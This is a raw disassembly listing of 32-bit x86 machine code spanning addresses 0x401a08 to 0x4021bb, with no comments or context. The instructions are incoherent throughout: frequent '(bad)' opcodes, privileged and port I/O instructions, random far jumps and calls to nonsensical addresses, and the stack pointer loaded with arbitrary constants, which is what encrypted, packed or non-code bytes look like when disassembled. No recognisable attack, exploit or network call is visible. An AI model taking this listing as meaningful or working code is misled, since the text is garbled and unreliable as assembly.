  401a08:	sbb    al,0x2f
  401a0a:	or     edx,DWORD PTR [esp+ebp*2]
  401a0d:	mov    eax,ds:0x318b1683
  401a12:	or     BYTE PTR [edi-0x1ddb655d],al
  401a18:	cmc    
  401a19:	ins    DWORD PTR es:[edi],dx
  401a1a:	dec    edi
  401a1b:	push   es
  401a1c:	and    esi,edx
  401a1e:	xor    eax,0xeabadade
  401a23:	pop    esi
  401a24:	js     0x401a8c
  401a26:	jp     0x4019fe
  401a28:	aas    
  401a29:	jb     0x4019f8
  401a2b:	es sub al,0x1b
  401a2e:	cmc    
  401a2f:	xchg   DWORD PTR [edx],edx
  401a31:	xor    DWORD PTR [edx+0x71],edx
  401a34:	data16 cmp bh,BYTE PTR [edi-0xe]
  401a38:	jg     0x401a31
  401a3a:	popf   
  401a3b:	ftst   
  401a3d:	rol    DWORD PTR [edx],0xd1
  401a40:	cmp    al,0xae
  401a42:	sub    BYTE PTR [eax-0x5a7c7833],dh
  401a48:	xor    eax,0x2d84eebe
  401a4d:	pop    ss
  401a4e:	mov    esp,0x9be9b9aa
  401a53:	ins    BYTE PTR es:[edi],dx
  401a54:	xchg   BYTE PTR cs:[edx-0x29304bd7],al
  401a5b:	ss (bad) 
  401a5e:	enter  0x754,0xae
  401a62:	push   ss
  401a63:	mov    ebp,0xc7f6e29d
  401a68:	jl     0x401abd
  401a6a:	and    edx,edx
  401a6c:	dec    ecx
  401a6d:	in     eax,0x6b
  401a6f:	loop   0x401a88
  401a71:	dec    ebp
  401a72:	cdq    
  401a73:	(bad)  
  401a74:	sti    
  401a75:	rcl    ecx,0x34
  401a78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a79:	sbb    DWORD PTR ds:0x92a4b84,0x244c5be3
  401a83:	mov    dh,0xa2
  401a85:	outs   dx,BYTE PTR ds:[esi]
  401a86:	xchg   edi,eax
  401a87:	xchg   ecx,eax
  401a88:	sub    edx,DWORD PTR [edi-0x4b]
  401a8b:	jns    0x401a75
  401a8d:	bound  ebp,QWORD PTR [edi-0x20af60b2]
  401a93:	rcr    BYTE PTR [esi-0x6d76611b],1
  401a99:	mov    esp,0x11867df9
  401a9e:	ins    DWORD PTR es:[edi],dx
  401a9f:	xchg   ebp,eax
  401aa0:	mov    bh,ah
  401aa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401aa3:	es dec edx
  401aa5:	ds loopne 0x401adc
  401aa8:	push   ebp
  401aa9:	push   ds
  401aaa:	aaa    
  401aab:	rep lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401aae:	repz sbb edi,DWORD PTR [edx+0x55]
  401ab2:	mov    BYTE PTR [ebx-0x3b90d1a7],ah
  401ab8:	inc    esp
  401ab9:	rcr    BYTE PTR [esi+0x308f9460],1
  401abf:	stc    
  401ac0:	sbb    eax,0xdc3494ed
  401ac5:	xor    al,0xa
  401ac7:	sbb    ebx,edx
  401ac9:	cmp    ebx,esi
  401acb:	sub    al,0x6e
  401acd:	or     ch,BYTE PTR [ebx*2+0x11d0b172]
  401ad4:	dec    eax
  401ad5:	jnp    0x401a5d
  401ad7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ad8:	jg     0x401a5e
  401ada:	xor    BYTE PTR [ecx+esi*1+0x64],al
  401ade:	lea    ebp,[edi+eax*1]
  401ae1:	sti    
  401ae2:	std    
  401ae3:	call   0x126d:0xbd2c768b
  401aea:	lds    edx,FWORD PTR [ebp-0x66]
  401aed:	lahf   
  401aee:	jno    0x401a75
  401af0:	sbb    cl,BYTE PTR [ebx]
  401af2:	jb     0x401ac6
  401af4:	add    BYTE PTR [eax-0x2d],ah
  401af7:	mov    esp,0xd7ea10c3
  401afc:	pop    ecx
  401afd:	loope  0x401abd
  401aff:	inc    edx
  401b00:	dec    edi
  401b01:	xchg   edx,eax
  401b02:	mov    eax,0x44dc04c5
  401b07:	popf   
  401b08:	or     esp,esi
  401b0a:	inc    edx
  401b0b:	es push ds
  401b0d:	retf   
  401b0e:	sbb    eax,0x1484bde5
  401b13:	jecxz  0x401ae7
  401b15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b16:	loop   0x401ac8
  401b18:	ss ins BYTE PTR es:[edi],dx
  401b1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b1b:	fdivr  st(4),st
  401b1d:	ds (bad) 
  401b1f:	mov    ebp,0xc63b0399
  401b24:	je     0x401b51
  401b26:	pop    ebp
  401b27:	or     ebp,edi
  401b29:	mov    edi,0x1eddc092
  401b2e:	mov    edi,DWORD PTR [ecx+0x58f5a020]
  401b34:	fwait
  401b35:	push   ecx
  401b36:	xchg   BYTE PTR [eax+0x25af09ee],dl
  401b3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b3d:	les    ecx,FWORD PTR [ebp+0x34]
  401b40:	fadd   st(4),st
  401b42:	push   esp
  401b43:	(bad)  
  401b44:	mov    ebx,0xafc90127
  401b49:	pop    esp
  401b4a:	ret    
  401b4b:	jns    0x401b3a
  401b4d:	mov    esp,0x37c9d81
  401b52:	push   ds
  401b53:	mov    dl,0xe1
  401b55:	rol    DWORD PTR [ecx],cl
  401b57:	mov    ah,0x42
  401b59:	inc    edi
  401b5a:	hlt    
  401b5b:	in     eax,dx
  401b5c:	ds jb  0x401b03
  401b5f:	mov    esi,0x8f57538c
  401b64:	xor    dl,BYTE PTR [edx]
  401b66:	out    dx,al
  401b67:	fisttp WORD PTR [eax-0x736383b0]
  401b6d:	fist   WORD PTR [edi]
  401b6f:	fld    DWORD PTR [ecx+ebp*1+0x3e]
  401b73:	aaa    
  401b74:	jb     0x401b50
  401b76:	mov    ds:0x34222f09,eax
  401b7b:	sbb    ebp,DWORD PTR [edi-0x41]
  401b7e:	xchg   esp,eax
  401b7f:	repnz ds push cs
  401b82:	call   0x7094:0x704f8434
  401b89:	mov    al,0x98
  401b8b:	call   ecx
  401b8d:	dec    eax
  401b8e:	jmpw   0xdf4e
  401b92:	xchg   edx,eax
  401b93:	(bad)  
  401b94:	(bad)  
  401b95:	push   esp
  401b96:	add    al,BYTE PTR [edi+0x4b]
  401b99:	hlt    
  401b9a:	fld    QWORD PTR [di]
  401b9d:	ret    
  401b9e:	rol    bl,1
  401ba0:	lock push esp
  401ba2:	(bad)  
  401ba4:	mov    dl,0xfa
  401ba6:	jmp    DWORD PTR [esi+0x5605464]
  401bac:	adc    dh,BYTE PTR [ecx]
  401bae:	mov    esi,0x24c8ea09
  401bb3:	jecxz  0x401bee
  401bb5:	stos   DWORD PTR es:[edi],eax
  401bb6:	lods   eax,DWORD PTR ds:[esi]
  401bb7:	xchg   esp,eax
  401bb8:	jne    0x401bfe
  401bba:	gs je  0x401c17
  401bbd:	test   bl,dl
  401bbf:	pop    esi
  401bc0:	adc    eax,0x384285db
  401bc5:	jno    0x401c12
  401bc7:	ds into 
  401bc9:	cwde   
  401bca:	aad    0x3c
  401bcc:	adc    eax,0x593a2b01
  401bd1:	ss pop esi
  401bd3:	loop   0x401b62
  401bd5:	cmp    edx,DWORD PTR [ecx-0x5e633e6c]
  401bdb:	jle    0x401c53
  401bdd:	data16 rcr dh,1
  401be0:	pop    edi
  401be1:	xor    bl,BYTE PTR [ecx-0x54ce4b25]
  401be7:	add    eax,0xbb74ab0a
  401bec:	aas    
  401bed:	cmp    al,0x89
  401bef:	xchg   edi,eax
  401bf0:	add    eax,0x747006b1
  401bf5:	repnz sbb BYTE PTR [edi],0x63
  401bf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bfa:	sub    eax,ecx
  401bfc:	mov    al,0x3e
  401bfe:	xchg   al,ch
  401c00:	and    edi,esi
  401c02:	inc    edx
  401c03:	popf   
  401c04:	xor    ebx,edx
  401c06:	bound  ebp,QWORD PTR [esi+0x77e872b3]
  401c0c:	push   ebp
  401c0d:	and    cl,BYTE PTR [ebx+0x6c]
  401c10:	cld    
  401c11:	(bad)  
  401c12:	clc    
  401c13:	aaa    
  401c14:	mov    ds:0x9e822c58,eax
  401c19:	mov    ebp,0x2ada95a9
  401c1e:	in     eax,dx
  401c1f:	dec    ebx
  401c20:	mov    ds:0x86bd3b41,eax
  401c25:	mov    dl,0xc9
  401c27:	lea    esp,[esi-0x49161a1b]
  401c2d:	jae    0x401bdf
  401c2f:	jmp    0x401c35
  401c31:	icebp  
  401c32:	mov    cl,BYTE PTR [eax]
  401c34:	pop    edi
  401c35:	dec    esi
  401c36:	test   al,0x2c
  401c38:	(bad)  
  401c39:	cmp    eax,edx
  401c3b:	cwde   
  401c3c:	push   ds
  401c3d:	or     dl,BYTE PTR [edx]
  401c3f:	outs   dx,DWORD PTR ds:[esi]
  401c40:	mov    ebp,0xbe463eae
  401c45:	ins    DWORD PTR es:[edi],dx
  401c46:	jne    0x401c99
  401c48:	loop   0x401bf2
  401c4a:	call   0xeacfc6dd
  401c4f:	mov    ds:0x471abbb9,eax
  401c54:	stos   BYTE PTR es:[edi],al
  401c55:	mov    esp,0x3a831987
  401c5a:	mov    edi,0x961e091a
  401c5f:	inc    esi
  401c60:	xchg   edx,eax
  401c61:	sbb    al,0x61
  401c63:	popf   
  401c64:	frstor [ecx]
  401c66:	sbb    BYTE PTR [esi+0x54c39a77],0x41
  401c6d:	leave  
  401c6e:	sahf   
  401c6f:	ret    
  401c70:	push   ecx
  401c71:	xor    BYTE PTR [eax-0x2cc481ca],0xa4
  401c78:	jnp    0x401cd1
  401c7a:	pop    esp
  401c7b:	inc    eax
  401c7c:	sahf   
  401c7d:	mov    bh,0x2b
  401c7f:	dec    ebx
  401c80:	movq   mm1,mm6
  401c83:	(bad)  
  401c84:	jecxz  0x401cda
  401c86:	mov    al,ds:0x1e15646a
  401c8b:	sbb    al,0xda
  401c8d:	rol    DWORD PTR [edx],cl
  401c8f:	popf   
  401c90:	cwde   
  401c91:	xor    eax,0x9a2d8456
  401c96:	repz xor DWORD PTR [edx],eax
  401c99:	and    cl,BYTE PTR [esi]
  401c9b:	popa   
  401c9c:	int    0x8f
  401c9e:	mov    eax,DWORD PTR [esi]
  401ca0:	xchg   edx,eax
  401ca1:	call   0xc69b:0xf83b1880
  401ca8:	or     al,BYTE PTR [ebp+0x35369101]
  401cae:	out    0x59,eax
  401cb0:	jb     0x401c75
  401cb2:	out    dx,eax
  401cb3:	in     eax,dx
  401cb4:	mov    ds:0xf4704c91,al
  401cb9:	adc    BYTE PTR ss:[eax],bl
  401cbc:	jae    0x401cdb
  401cbe:	sub    DWORD PTR [edx-0x12e02854],esp
  401cc4:	xchg   esi,eax
  401cc5:	fidivr DWORD PTR [esi+0x3b896b13]
  401ccb:	cli    
  401ccc:	ret    
  401ccd:	mov    ch,0xd2
  401ccf:	stos   BYTE PTR es:[edi],al
  401cd0:	sbb    BYTE PTR [ecx],cl
  401cd2:	js     0x401c94
  401cd4:	xor    esi,DWORD PTR [esi+0x31]
  401cd7:	sti    
  401cd8:	inc    esp
  401cd9:	mov    ebp,0x15b621d
  401cde:	clc    
  401cdf:	jno    0x401d31
  401ce1:	lds    ebp,FWORD PTR [ebx]
  401ce3:	cmp    eax,0xef76f907
  401ce8:	into   
  401ce9:	or     ebx,DWORD PTR [ebp-0x493b623d]
  401cef:	cmp    BYTE PTR [eax],al
  401cf1:	lea    ebx,[ecx]
  401cf3:	lds    esi,FWORD PTR [ecx+0x44]
  401cf6:	pusha  
  401cf7:	mov    DWORD PTR [edi-0x33],ecx
  401cfa:	loopne 0x401ca0
  401cfc:	push   ebx
  401cfd:	arpl   WORD PTR [ebp-0x44],bx
  401d00:	jmp    0x9411c7b3
  401d05:	add    al,0xa1
  401d07:	cmp    ecx,DWORD PTR ss:[ecx]
  401d0a:	inc    eax
  401d0b:	bound  ebx,QWORD PTR [esi]
  401d0d:	inc    edx
  401d0e:	mov    ebp,0xaccfd43
  401d13:	xchg   BYTE PTR [esi-0x9],ah
  401d16:	inc    edi
  401d17:	imul   ebx,DWORD PTR [edx-0x26d618ca],0xe7934e3b
  401d21:	jp     0x401d98
  401d23:	cmp    BYTE PTR [edi-0x4c],bh
  401d26:	xchg   edx,eax
  401d27:	ds push ebx
  401d29:	shl    BYTE PTR [edi+0x6b095926],1
  401d2f:	or     dh,al
  401d31:	sub    BYTE PTR [eax+0x7b5a0df4],dh
  401d37:	int3   
  401d38:	dec    esp
  401d39:	sub    eax,0x94048024
  401d3e:	cmc    
  401d3f:	out    dx,al
  401d40:	add    al,0xea
  401d42:	scas   eax,DWORD PTR es:[edi]
  401d43:	loope  0x401d47
  401d45:	adc    bh,BYTE PTR [eax+0x22]
  401d48:	mov    bh,0x5d
  401d4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d4b:	out    dx,eax
  401d4c:	pop    ds
  401d4d:	and    eax,0xbefb8ee9
  401d52:	or     al,0xc5
  401d54:	(bad)  
  401d55:	loope  0x401dba
  401d57:	mov    cl,0xf6
  401d59:	ret    
  401d5a:	jae    0x401dcc
  401d5c:	in     al,0xeb
  401d5e:	out    0x74,al
  401d60:	and    al,0x45
  401d62:	push   ecx
  401d63:	jg     0x401d49
  401d65:	retf   0x44e2
  401d68:	mov    bh,al
  401d6a:	outs   dx,DWORD PTR ds:[esi]
  401d6b:	add    al,0x2a
  401d6d:	mov    al,0xbe
  401d6f:	push   cs
  401d70:	xor    al,0x9e
  401d72:	add    DWORD PTR [eax-0x57cbeeda],ebp
  401d78:	push   edx
  401d79:	adc    eax,DWORD PTR [ebx+0x41e0c3f6]
  401d7f:	inc    edx
  401d80:	cmp    BYTE PTR es:[edx-0x4],bh
  401d84:	aas    
  401d85:	push   ds
  401d86:	lea    eax,[edx]
  401d88:	fild   QWORD PTR [ebp-0x2e6af027]
  401d8e:	and    al,0x74
  401d90:	push   eax
  401d91:	pusha  
  401d92:	and    bl,ah
  401d94:	pop    esi
  401d95:	fcom   DWORD PTR [eax-0x28]
  401d98:	xchg   ecx,eax
  401d99:	enter  0x9d4b,0xd8
  401d9d:	std    
  401d9e:	out    0x79,al
  401da0:	inc    edx
  401da1:	cld    
  401da2:	test   al,0x4a
  401da4:	int3   
  401da5:	test   al,0x6e
  401da7:	jmp    0x40ab8bf1
  401dac:	ja     0x401d86
  401dae:	cmp    BYTE PTR [esp+ebx*8-0x2b051aaa],0x92
  401db6:	retf   
  401db7:	push   edx
  401db8:	push   edx
  401db9:	pop    ds
  401dba:	ss loop 0x401d43
  401dbd:	das    
  401dbe:	inc    eax
  401dbf:	pop    edi
  401dc0:	lock pop ds
  401dc2:	imul   ebp,DWORD PTR [eax],0xa08e808c
  401dc8:	jl     0x401dc4
  401dca:	jno    0x401d55
  401dcc:	sub    eax,0x23d6d12b
  401dd1:	pop    ebp
  401dd2:	jg     0x401e1e
  401dd4:	sub    esi,DWORD PTR [ebx+edi*2-0x790fa3ab]
  401ddb:	ret    0x1fec
  401dde:	loope  0x401dfa
  401de0:	scas   eax,DWORD PTR es:[edi]
  401de1:	ins    DWORD PTR es:[edi],dx
  401de2:	clc    
  401de3:	data16 cmp al,0x4f
  401de6:	sbb    edx,DWORD PTR [eax]
  401de8:	sbb    al,0xb3
  401dea:	push   ds
  401deb:	cmc    
  401dec:	rol    DWORD PTR [eax],1
  401dee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401def:	ss mov cl,0x3b
  401df2:	dec    BYTE PTR [ebx+0x127d60c9]
  401df8:	icebp  
  401df9:	pop    edi
  401dfa:	cmp    bh,BYTE PTR [edx]
  401dfc:	mov    DWORD PTR [edi],0x55a0e532
  401e02:	or     cl,bl
  401e04:	jns    0x401e5a
  401e06:	jl     0x401e63
  401e08:	mov    DWORD PTR [edi],esp
  401e0a:	(bad)  
  401e0b:	hlt    
  401e0c:	mov    edx,0xb1e5a84b
  401e11:	cmp    esp,ebp
  401e13:	scas   eax,DWORD PTR es:[edi]
  401e14:	sbb    al,0x87
  401e16:	popf   
  401e17:	mov    bh,0xba
  401e19:	mov    eax,0xbf3dec72
  401e1e:	mov    ebp,0xbecba653
  401e23:	add    BYTE PTR [ecx-0x13],cl
  401e26:	jbe    0x401e25
  401e28:	fucom  st(3)
  401e2a:	sbb    eax,0xb5430f01
  401e2f:	or     al,0x99
  401e31:	cs std 
  401e33:	adc    ecx,DWORD PTR [ebx]
  401e35:	imul   eax,DWORD PTR [edx-0x6101d84e],0xfbf2a293
  401e3f:	sub    eax,0x675ebbf1
  401e44:	sbb    dh,BYTE PTR [ecx]
  401e46:	lahf   
  401e47:	xchg   BYTE PTR [ebx+0x25],dh
  401e4a:	out    0x94,eax
  401e4c:	dec    esi
  401e4d:	dec    eax
  401e4e:	or     dh,BYTE PTR [ebp-0x67]
  401e51:	out    dx,eax
  401e52:	add    edi,0xb0abf778
  401e58:	pop    ebx
  401e59:	jecxz  0x401e29
  401e5b:	push   0x1ea71805
  401e60:	add    al,0xf0
  401e62:	mov    al,0xee
  401e64:	cmp    ebx,ebp
  401e66:	push   ecx
  401e67:	fisttp WORD PTR [bp+di+0x199]
  401e6c:	jns    0x401e5d
  401e6e:	iret   
  401e6f:	xor    BYTE PTR [edx-0x6],ah
  401e72:	ss repnz pop ds
  401e75:	loopne 0x401ed7
  401e77:	sub    eax,0xf1a02eba
  401e7c:	adc    BYTE PTR [esi+0x4c8112b5],ch
  401e82:	imul   bh
  401e84:	cmp    al,0xba
  401e86:	push   ecx
  401e87:	fidiv  WORD PTR [eax]
  401e89:	ficom  WORD PTR [ebp-0x6ba34335]
  401e8f:	fsubr  st,st(5)
  401e91:	add    dh,bl
  401e93:	mov    bl,0x62
  401e95:	aaa    
  401e96:	or     ah,BYTE PTR [ebx-0xe]
  401e99:	call   0xb67d905e
  401e9e:	push   cs
  401e9f:	mov    ah,0x90
  401ea1:	fadd   st,st(5)
  401ea3:	xchg   DWORD PTR [edi],esi
  401ea5:	push   ss
  401ea6:	addr16 jno 0x401f21
  401ea9:	das    
  401eaa:	cdq    
  401eab:	ror    DWORD PTR [esi+esi*8+0x6e4e8436],1
  401eb2:	daa    
  401eb3:	mov    ds:0xf3408c9f,al
  401eb8:	fistp  WORD PTR [edi+edi*1-0x3f]
  401ebc:	std    
  401ebd:	dec    ecx
  401ebe:	cmc    
  401ebf:	jns    0x401ed0
  401ec1:	test   al,0xca
  401ec3:	adc    BYTE PTR [esp+eiz*4+0x69ad0924],bl
  401eca:	(bad)  
  401ecb:	jne    0x401e74
  401ecd:	lds    ebx,FWORD PTR [ebp+0x68042c47]
  401ed3:	mov    esp,0x88f9cb77
  401ed8:	xor    edi,0xe5bf2d2b
  401ede:	daa    
  401edf:	ret    
  401ee0:	jge    0x401e99
  401ee2:	jmp    0xb511:0xda61c8f0
  401ee9:	xchg   esp,eax
  401eea:	mov    bh,0xcb
  401eec:	and    eax,0x8d25c34a
  401ef1:	hlt    
  401ef2:	jmp    0x7370:0xe3929c43
  401ef9:	hlt    
  401efa:	mov    eax,ds:0xc8ad02ec
  401eff:	adc    eax,0x703a7b5b
  401f04:	mov    ecx,0xf202ed5
  401f09:	sar    ebx,0xc9
  401f0c:	inc    edx
  401f0d:	pop    ebp
  401f0e:	hlt    
  401f0f:	cmp    al,0xc
  401f11:	sbb    BYTE PTR ds:0xd15a456a,cl
  401f17:	out    0xc5,al
  401f19:	ins    BYTE PTR es:[edi],dx
  401f1a:	repz jae 0x401f06
  401f1d:	test   BYTE PTR [eax+eiz*1],al
  401f20:	and    ebp,DWORD PTR [edi+edx*2+0x4b]
  401f24:	(bad)  
  401f25:	dec    esp
  401f26:	jne    0x401f59
  401f28:	ficomp WORD PTR [eax-0x12]
  401f2b:	loopne 0x401f6f
  401f2d:	jle    0x401ef5
  401f2f:	outs   dx,DWORD PTR ds:[esi]
  401f30:	pop    ds
  401f31:	adc    ecx,DWORD PTR [esi-0x1501269e]
  401f37:	lahf   
  401f38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f39:	sub    ah,BYTE PTR [esp+edi*8-0x2c]
  401f3d:	sbb    eax,0x24d6427e
  401f42:	popa   
  401f43:	jmp    0x446f2b3c
  401f48:	setle  BYTE PTR [ecx]
  401f4b:	imul   esp,DWORD PTR [edx-0x6fcd4748],0xffffffb4
  401f52:	push   es
  401f53:	rcl    DWORD PTR [ebx],cl
  401f55:	pop    esp
  401f56:	in     al,dx
  401f57:	pusha  
  401f58:	gs stos DWORD PTR es:[edi],eax
  401f5a:	push   es
  401f5b:	nop
  401f5c:	out    dx,al
  401f5d:	lea    esp,[eax]
  401f5f:	daa    
  401f60:	adc    dh,BYTE PTR [edi+0x6]
  401f63:	loop   0x401f6d
  401f65:	cmc    
  401f66:	sub    BYTE PTR [eax+0x35837b69],dl
  401f6c:	(bad)  
  401f6e:	add    DWORD PTR [ebx-0x23f377e1],esp
  401f74:	push   edi
  401f75:	inc    esp
  401f76:	push   esi
  401f77:	lds    esi,FWORD PTR [eax+0x43fa02bb]
  401f7d:	jae    0x401fe4
  401f7f:	mov    bh,0x6e
  401f81:	lods   eax,DWORD PTR ds:[esi]
  401f82:	mov    al,ds:0x3048aeb8
  401f87:	inc    esp
  401f88:	call   0x21fe3143
  401f8d:	dec    ecx
  401f8e:	out    0x86,eax
  401f90:	fst    st(6)
  401f92:	jmp    0x5650:0xc642a202
  401f99:	mov    dh,0x22
  401f9b:	push   ds
  401f9c:	xchg   edi,eax
  401f9d:	mov    edi,0xdcb1a147
  401fa2:	pop    ebx
  401fa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401fa4:	jbe    0x402017
  401fa6:	dec    esi
  401fa7:	pop    ebx
  401fa8:	retf   0x3745
  401fab:	sti    
  401fac:	push   0xfffffff7
  401fae:	jmp    0xaa8d:0x73e23558
  401fb5:	out    0xaa,eax
  401fb7:	ret    
  401fb8:	fidivr DWORD PTR [ebp-0x29]
  401fbb:	pop    esp
  401fbc:	pop    ebx
  401fbd:	inc    eax
  401fbe:	mov    bh,0x53
  401fc0:	jge    0x401ff3
  401fc2:	or     DWORD PTR [eax+0x71e25337],edi
  401fc8:	fwait
  401fc9:	xchg   esi,eax
  401fca:	hlt    
  401fcb:	adc    eax,eax
  401fcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401fce:	xor    DWORD PTR [edx],0x1a
  401fd1:	retf   0x2520
  401fd4:	push   0x1650eeb3
  401fd9:	inc    esp
  401fda:	or     al,0x6
  401fdc:	adc    al,0xa8
  401fde:	out    dx,eax
  401fdf:	pop    eax
  401fe0:	adc    al,0x33
  401fe2:	and    dl,dh
  401fe4:	mov    bh,0x48
  401fe6:	int    0xe1
  401fe8:	jmp    0xbb24:0x59939236
  401fef:	mov    ?,WORD PTR [eax+0x39]
  401ff2:	push   esi
  401ff3:	ret    
  401ff4:	cld    
  401ff5:	push   cs
  401ff6:	cmp    DWORD PTR [edi-0x22],edx
  401ff9:	syscall 
  401ffb:	mov    ch,bl
  401ffd:	cli    
  401ffe:	cdq    
  401fff:	cmc    
  402000:	xor    BYTE PTR [edi-0x6de1a008],0xf2
  402007:	adc    al,0x8f
  402009:	loop   0x402084
  40200b:	xor    eax,0x43e6e2e9
  402010:	iret   
  402011:	push   edx
  402012:	aas    
  402013:	pop    esp
  402014:	mov    bh,0x5a
  402016:	adc    DWORD PTR [edi],edx
  402018:	mul    ch
  40201a:	xor    al,0x6f
  40201c:	ds clc 
  40201e:	sti    
  40201f:	cdq    
  402020:	pop    ss
  402021:	outs   dx,DWORD PTR ds:[esi]
  402022:	das    
  402023:	push   edx
  402024:	imul   edi,DWORD PTR [esp+edx*2],0x4b291672
  40202b:	adc    al,0xa1
  40202d:	out    0x23,eax
  40202f:	xor    al,0xe6
  402031:	std    
  402032:	mov    DWORD PTR [ecx+0xdb4d9ee],esp
  402038:	inc    ecx
  402039:	add    al,0x83
  40203b:	jecxz  0x402079
  40203d:	rcl    edi,1
  40203f:	das    
  402040:	dec    ebp
  402041:	(bad)  
  402042:	jae    0x40209b
  402044:	pop    edi
  402045:	mov    bl,0xe2
  402047:	shr    DWORD PTR [eax+0x2a],cl
  40204a:	cmp    esi,ebp
  40204c:	jo     0x402070
  40204e:	cmp    ch,BYTE PTR [esi+0xd]
  402051:	adc    BYTE PTR [edi+ecx*4+0x10d3db2e],al
  402058:	sub    DWORD PTR [ebp-0x67bf1b42],ebp
  40205e:	mov    bl,0xce
  402060:	cmp    al,0x2f
  402062:	test   BYTE PTR [edx-0x5c],0x3
  402066:	inc    edi
  402067:	and    eax,0xdf3657f8
  40206c:	sub    ch,al
  40206e:	sub    bh,bl
  402070:	sub    al,0x9c
  402072:	add    edi,DWORD PTR [edi+esi*4]
  402075:	sbb    dl,dh
  402077:	mov    dh,0x6f
  402079:	fadd   QWORD PTR [esi-0x3e]
  40207c:	test   eax,0xa6ed0885
  402081:	mov    eax,0x10a5ce33
  402086:	outs   dx,BYTE PTR ds:[esi]
  402087:	mov    ebx,0xe8c1db0f
  40208c:	inc    eax
  40208d:	add    BYTE PTR [edi-0x2a0afa72],dl
  402093:	inc    ebp
  402094:	inc    ecx
  402095:	cdq    
  402096:	mov    edx,0x7a244643
  40209b:	dec    esi
  40209c:	jae    0x4020c4
  40209e:	stos   DWORD PTR es:[edi],eax
  40209f:	leave  
  4020a0:	mov    dl,0x10
  4020a2:	repz sub esp,esi
  4020a5:	or     bl,dh
  4020a7:	sub    al,0x96
  4020a9:	sbb    eax,0xec89c4f0
  4020ae:	jle    0x4020d5
  4020b0:	lods   eax,DWORD PTR ds:[esi]
  4020b1:	push   ebp
  4020b2:	or     esi,DWORD PTR [esi]
  4020b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020b5:	pop    eax
  4020b6:	jo     0x402075
  4020b8:	std    
  4020b9:	aaa    
  4020ba:	sub    al,0x1
  4020bc:	imul   edi,DWORD PTR [esi],0xffffffb2
  4020bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020c0:	dec    ecx
  4020c1:	leave  
  4020c2:	xor    DWORD PTR [ecx-0x3bf91199],ecx
  4020c8:	adc    DWORD PTR [esi],ebx
  4020ca:	sub    eax,DWORD PTR [ebp+0x45]
  4020cd:	lds    ecx,FWORD PTR [ecx-0x6e]
  4020d0:	cmp    eax,0xec172e81
  4020d5:	fistp  WORD PTR [eax+0x68124754]
  4020db:	sti    
  4020dc:	inc    edx
  4020dd:	retf   
  4020de:	dec    edx
  4020df:	cmc    
  4020e0:	push   cs
  4020e1:	fdiv   QWORD PTR [edi+edx*1]
  4020e4:	sub    al,0x4c
  4020e6:	int3   
  4020e7:	xchg   ebx,ecx
  4020e9:	rol    BYTE PTR [ebx-0x1e],cl
  4020ec:	mov    dh,ah
  4020ee:	add    eax,0x47e38d6c
  4020f3:	mov    ebp,0x2059e4f
  4020f8:	(bad)  
  4020fa:	push   edi
  4020fb:	mov    esi,0xcd274411
  402100:	pusha  
  402101:	cmp    edi,eax
  402103:	fwait
  402104:	sti    
  402105:	cmp    dh,0xf9
  402108:	mov    esi,0xa8946ce1
  40210d:	lea    eax,[edi+edi*2-0x6b]
  402111:	call   0x89a371a1
  402116:	or     dh,0x7a
  402119:	and    dl,BYTE PTR [ebx]
  40211b:	jmp    0xfe86:0xc301d56b
  402122:	pop    ss
  402123:	cmp    cl,BYTE PTR [ebx]
  402125:	test   al,0x58
  402127:	cs jle 0x4020b3
  40212a:	jg     0x4020ed
  40212c:	sub    ah,BYTE PTR [ebx]
  40212e:	jle    0x40218b
  402130:	aas    
  402131:	loop   0x4020c9
  402133:	cmc    
  402134:	mov    edx,0x7b1f0e24
  402139:	pop    ecx
  40213a:	jns    0x402119
  40213c:	ror    ebx,cl
  40213e:	in     eax,dx
  40213f:	sub    ebx,DWORD PTR [ebx-0x51]
  402142:	push   0xffffffa0
  402144:	mov    WORD PTR [edi-0x6cf37161],es
  40214a:	in     eax,dx
  40214b:	jle    0x402173
  40214d:	push   eax
  40214e:	sub    eax,DWORD PTR [eax]
  402150:	or     BYTE PTR [edx+ecx*2+0x1a],dl
  402154:	loopne 0x402148
  402156:	cmc    
  402157:	ja     0x402102
  402159:	pop    es
  40215a:	xchg   BYTE PTR [edi+ecx*2],dl
  40215d:	nop
  40215e:	push   ebp
  40215f:	or     al,0x5c
  402161:	add    BYTE PTR [eax-0x28],0xf2
  402165:	sbb    DWORD PTR ds:0x27145e7f,0x8f94675a
  40216f:	push   cs
  402170:	int3   
  402171:	das    
  402172:	mov    bh,0x4b
  402174:	or     BYTE PTR [ebx+edx*8],ch
  402177:	push   es
  402178:	in     al,dx
  402179:	sti    
  40217a:	stc    
  40217b:	mov    dh,0x73
  40217d:	aas    
  40217e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40217f:	repz jp 0x40215b
  402182:	lods   eax,DWORD PTR ds:[esi]
  402183:	outs   dx,BYTE PTR ds:[esi]
  402184:	ror    ecx,0x33
  402187:	popf   
  402188:	inc    eax
  402189:	shl    BYTE PTR [esi-0x70],1
  40218c:	test   BYTE PTR [eax-0x47],dl
  40218f:	xor    BYTE PTR [edx-0xc],0x7a
  402193:	icebp  
  402194:	dec    esi
  402195:	stc    
  402196:	clc    
  402197:	push   ebp
  402198:	call   0x9ff51399
  40219d:	test   DWORD PTR [ebx],ebx
  40219f:	rsm    
  4021a1:	pop    edi
  4021a2:	jge    0x4021c3
  4021a4:	out    dx,al
  4021a5:	xor    edx,esi
  4021a7:	jp     0x4021da
  4021a9:	or     ax,0x3a5e
  4021ad:	add    DWORD PTR ds:0x758f4dc9,esi
  4021b3:	sbb    eax,0x83f546cc
  4021b8:	dec    esi
  4021b9:	mov    ch,0xaf
  4021bb:	rol    BYTE PTR [edi+0x79],1
